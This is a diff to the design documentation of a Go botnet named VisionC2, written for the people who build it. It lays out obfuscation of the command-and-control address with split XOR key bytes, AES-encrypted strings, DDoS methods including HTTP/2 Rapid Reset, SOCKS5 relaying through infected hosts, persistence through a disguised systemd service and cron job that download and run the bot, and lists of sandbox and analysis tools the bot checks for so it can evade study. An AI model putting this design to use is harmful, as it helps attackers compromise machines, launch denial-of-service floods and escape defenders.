@@ -282,7 +282,7 @@ Plaintext C2 ("192.168.1.1:443")
 └──────────────────────────────────────────────────┘
         │
         ▼
-Stored as `const gothTits = "EkAJ9ezFRv5F..."` in bot/main.go
+Stored as `const gothTits = "EkAJ9ezFRv5F..."` in bot/config.go
 ```
 
 **Decoding Pipeline (`venusaur()` in `opsec.go`):**
@@ -295,23 +295,52 @@ Exact reverse of encoding:
 
 **Key Derivation (`charizard()` in `opsec.go`):**
 ```
-cryptSeed (8-char hex, e.g., "292ae3aa")
+cryptSeed (8-char hex, e.g., "85fb7480")
     │
     ▼
-MD5( seed + [mew()⊕mewtwo()⊕celebi()⊕jirachi()] + entropy )
+MD5( seed + [16 XOR key bytes] + entropy )
     │
-    │ Split key bytes (anti-static-analysis):
-    │ mew() = 0x31 ^ 0x64 = 0x55
-    │ mewtwo() = 0x72 ^ 0x17 = 0x65
-    │ celebi() = 0x93 ^ 0xC6 = 0x55
-    │ jirachi() = 0xA4 ^ 0x81 = 0x25
+    │ 16 split key bytes (anti-static-analysis):
+    │ mew()=0xCC^0xA6  mewtwo()=0xC3^0x91  celebi()=0x79^0xC0  jirachi()=0x4F^0xAA
+    │ shaymin()=0x51^0x80  phione()=0x75^0xD1  manaphy()=0x4B^0x7C  victini()=0x87^0x86
+    │ keldeo()=0xFC^0x7C  meloetta()=0xD2^0x54  genesect()=0xE9^0xEC  diancie()=0x77^0xF1
+    │ hoopa()=0x3B^0x4C  volcanion()=0x3C^0x9D  magearna()=0x6C^0x3C  marshadow()=0x97^0x33
     │
     │ Entropy bytes:
     │ [0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE]
     │ XOR'd with position-based values: (len(seed) + i*17) & 0xFF
     │
     ▼
-16-byte MD5 hash (used as RC4 key + XOR key)
+16-byte MD5 hash (used as RC4 key + XOR key for C2 address)
+```
+
+**Sensitive String Encryption (`garuda()` in `opsec.go`):**
+```
+Encrypted blob (hex-encoded IV‖ciphertext in config.go)
+    │
+    ▼
+┌─ AES-128-CTR Decryption ──────────────────────┐
+│ Key: raw 16 bytes from XOR byte functions     │
+│ IV:  first 16 bytes of blob                   │
+│ CT:  remaining bytes after IV                 │
+│ Decrypt via AES-128-CTR stream cipher         │
+└───────────────────────────────────────────────┘
+    │
+    ▼
+Plaintext string (or null-separated slice)
+
+initSensitiveStrings() decrypts all blobs at startup
+before any other code references them.
+```
+
+**Crypto CLI Tool (`tools/crypto.go`):**
+```
+go run tools/crypto.go encrypt <string>            → hex blob
+go run tools/crypto.go encrypt-slice <a> <b> ...   → hex blob (null-separated)
+go run tools/crypto.go decrypt <hex>               → plaintext
+go run tools/crypto.go decrypt-slice <hex>          → indexed list
+go run tools/crypto.go generate                    → all blobs for config.go
+go run tools/crypto.go verify                      → verify config.go blobs
 ```
 
 ### Bot TLS Transport Layer
@@ -350,6 +379,13 @@ botID = MD5(hostname + ":" + MAC_address)[:8]
 **Startup Sequence (`main()` in `bot/main.go`):**
 ```
 Bot Binary Executed
+        │
+        ▼
+┌─ initSensitiveStrings() ────────┐
+│ Decrypt all AES-128-CTR blobs   │
+│ from config.go into runtime vars│
+│ (must run before anything else) │
+└─────────────────────────────────┘
         │
         ▼
 ┌─ stuxnet() ─────────────────────┐
@@ -455,7 +491,7 @@ Connected via TLS
 | Rapid Reset | `arkrai()` / `darkraiProxy()` / `giratina()` | HTTP/2 CVE-2023-44487 — batched HEADERS+RST_STREAM |
 
 **Concurrency & Control:**
-- All attacks spawn `cozyBear` (default **4020**) goroutine workers
+- All attacks spawn `cozyBear` (default **2024**) goroutine workers
 - `raichu()` returns a stop channel, marks attack as running
 - `pikachu()` closes the stop channel, all workers exit via `select`
 - Each attack respects `context.WithTimeout` for automatic expiry
@@ -485,7 +521,9 @@ Operator → SOCKS5 Client → Bot (port X) → Target
 
 **Supported SOCKS5 Features:**
 - Address types: IPv4 (0x01), Domain (0x03), IPv6 (0x04)
-- No authentication (method 0x00)
+- Username/password authentication (method 0x02, RFC 1929) when `socksUsername`/`socksPassword` are set in `config.go`
+- Falls back to no authentication (method 0x00) when credentials are empty
+- Credentials updatable at runtime via `!socksauth <user> <pass>`
 - CONNECT command (0x01)
 - Bidirectional `io.Copy` relay with proper `CloseWrite` half-close
 
@@ -497,27 +535,29 @@ Operator → SOCKS5 Client → Bot (port X) → Target
 | Cron | `lazarus()` | Installs `* * * * * pgrep -x <name> \|\| <exe> &` |
 
 **Full Persistence (`!persist` command via `dragonfly()`):**
-Sets up comprehensive persistence:
-1. **Hidden Directory**: Creates `/var/lib/.redis_helper/`
-2. **Persistence Script**: Writes `.redis_script.sh` that downloads and runs the bot
-3. **Systemd Service**: Creates `redis-helper.service` with `Restart=always`
+Sets up comprehensive persistence (all paths/names from encrypted config):
+1. **Hidden Directory**: Creates `/var/lib/.httpd_cache/`
+2. **Persistence Script**: Writes `.httpd_check.sh` that downloads and runs the bot
+3. **Systemd Service**: Creates `httpd-cache.service` with `Restart=always`
 4. **Cron Backup**: Installs cron job via `carbanak()` as fallback
 
 **File Structure:**
 ```
-/var/lib/.redis_helper/
-├── .redis_script.sh # Download + execute script
-└── .redis_process # Bot binary (disguised name)
+/var/lib/.httpd_cache/
+├── .httpd_check.sh  # Download + execute script
+└── .httpd_worker    # Bot binary (disguised name)
 /etc/systemd/system/
-└── redis-helper.service # Auto-restart systemd unit
+└── httpd-cache.service # Auto-restart systemd unit
 ```
+
+**Cleanup:** `tools/cleanup.sh` removes all persistence artifacts (run as root).
 
 **Debug Mode:**
 When `debugMode = true`, persistence functions **only log** what they would do — no actual file writes or system modifications. This prevents accidental persistence during development.
 
 ### Bot Anti-Analysis & Sandbox Detection
 **`winnti()` — Sandbox Detection (`opsec.go`):**
-Three detection methods, checked at startup:
+Three detection methods, checked at startup. All indicator lists are AES-128-CTR encrypted in `config.go` and decrypted at runtime by `initSensitiveStrings()` — no plaintext signatures in the binary.
 
 **1. VM Process Detection** — Scans `/proc/*/cmdline` for:
 ```
@@ -525,14 +565,17 @@ vmware, vbox, virtualbox, qemu, firejail, bubblewrap,
 gvisor, kata, cuckoo, joesandbox, cape, any.run, hybrid-analysis
 ```
 
-**2. Analysis Tool Detection** — Checks if these are running:
+**2. Analysis Tool Detection** — Checks 40+ tool paths including:
 ```
-strace, ltrace, gdb, radare2, ghidra, ida, wireshark, tshark, tcpdump
+strace, ltrace, gdb, lldb, radare2, rizin, ghidra, ida, ida64,
+wireshark, tshark, tcpdump, yara, ssdeep, binwalk, sysdig, bpftrace,
+auditd, rkhunter, chkrootkit, clamdscan, volatility, ...
 ```
 
 **3. Debugger Parent Check** — Reads `/proc/<ppid>/cmdline` for:
 ```
-gdb, strace, ltrace, radare2, rr
+gdb, lldb, strace, ltrace, radare2, r2, rizin, rr, valgrind,
+perf, ida, ida64, ghidra, sysdig, bpftrace, frida, frida-server
 ```
 
 **Detection Response:**
@@ -588,12 +631,13 @@ VisionC2/
 ├── setup.py              # Interactive setup wizard (Python 3)
 ├── server                # Compiled CNC binary
 ├── bot/                  # Bot agent source
-│   ├── main.go           # Entry point, config, shell exec, main loop
+│   ├── main.go           # Entry point, shell exec, main loop
+│   ├── config.go         # All tuneable constants, encrypted sensitive strings, initSensitiveStrings()
 │   ├── connection.go     # TLS connection, DNS resolution, auth, C2 handler
 │   ├── attacks.go        # L4/L7 DDoS attack methods + proxy support
-│   ├── opsec.go          # Encryption, sandbox detection, bot ID generation
+│   ├── opsec.go          # Encryption (AES-128-CTR, RC4, key derivation), sandbox detection, bot ID, daemonization
 │   ├── persist.go        # Persistence mechanisms (cron, systemd, rc.local)
-│   └── socks.go          # SOCKS5 proxy server implementation
+│   └── socks.go          # SOCKS5 proxy server with username/password auth (RFC 1929)
 ├── cnc/                  # CNC server source
 │   ├── main.go           # Server entry, TLS listener, user listener
 │   ├── connection.go     # TLS config, bot auth handler, bot management
@@ -604,6 +648,8 @@ VisionC2/
 │   └── certificates/     # TLS certs (server.crt, server.key)
 ├── tools/
 │   ├── build.sh          # Cross-compilation for 14 architectures
+│   ├── crypto.go         # Unified AES-128-CTR encrypt/decrypt/verify CLI tool
+│   ├── cleanup.sh        # Remove bot persistence artifacts from a Linux machine
 │   └── deUPX.py          # UPX signature stripper
 ├── bins/                 # Compiled bot binaries (output)
 └── Docs/
@@ -662,7 +708,7 @@ go build -trimpath -ldflags="-s -w -buildid=" -o <name> ./bot
 4. Obfuscate C2 address (5-layer encoding) + verification
 5. Generate TLS certificates (4096-bit RSA, self-signed) or use custom
 6. Update source files via regex replacement:
-   - `bot/main.go`: `gothTits`, `cryptSeed`, `magicCode`, `protocolVersion`, `debugMode`
+   - `bot/config.go`: `gothTits`, `cryptSeed`, `magicCode`, `protocolVersion`, `debugMode`
    - `cnc/main.go`: `MAGIC_CODE`, `PROTOCOL_VERSION`, `USER_SERVER_PORT`
 7. Build CNC server + bot binaries
 8. Save configuration to `setup_config.txt`
@@ -708,19 +754,39 @@ All functions use APT group / Pokémon-themed names to make code harder to under
 | `darkrai` | UDP TXT record lookup |
 | `rayquaza` | A record fallback |
 
-**Key Derivation — Mythical Pokémon:**
+**Key Derivation — Mythical Pokémon (16 bytes):**
 | Name | Real Purpose |
 |------|-------------|
-| `mew` | Key byte 1 (0x55) |
-| `mewtwo` | Key byte 2 (0x65) |
-| `celebi` | Key byte 3 (0x55) |
-| `jirachi` | Key byte 4 (0x25) |
+| `mew` | Key byte 1 (0xCC^0xA6) |
+| `mewtwo` | Key byte 2 (0xC3^0x91) |
+| `celebi` | Key byte 3 (0x79^0xC0) |
+| `jirachi` | Key byte 4 (0x4F^0xAA) |
+| `shaymin` | Key byte 5 (0x51^0x80) |
+| `phione` | Key byte 6 (0x75^0xD1) |
+| `manaphy` | Key byte 7 (0x4B^0x7C) |
+| `victini` | Key byte 8 (0x87^0x86) |
+| `keldeo` | Key byte 9 (0xFC^0x7C) |
+| `meloetta` | Key byte 10 (0xD2^0x54) |
+| `genesect` | Key byte 11 (0xE9^0xEC) |
+| `diancie` | Key byte 12 (0x77^0xF1) |
+| `hoopa` | Key byte 13 (0x3B^0x4C) |
+| `volcanion` | Key byte 14 (0x3C^0x9D) |
+| `magearna` | Key byte 15 (0x6C^0x3C) |
+| `marshadow` | Key byte 16 (0x97^0x33) |
+
+**Crypto Functions — Pokémon:**
+| Name | Real Purpose |
+|------|-------------|
+| `charizard` | Key derivation (MD5, for C2 address obfuscation) |
+| `venusaur` | Multi-layer C2 address decoder |
+| `blastoise` | RC4 stream cipher |
+| `garuda` | AES-128-CTR decrypt (sensitive strings) |
 
 **CNC Variables:**
 | Name | Real Purpose |
 |------|-------------|
 | `fancyBear` | Reconnection delay (5s) |
-| `cozyBear` | Worker count (2048) |
+| `cozyBear` | Worker count (2024) |
 | `equationGroup` | Buffer size (256) |
 | `gothTits` | Obfuscated C2 address constant |
 
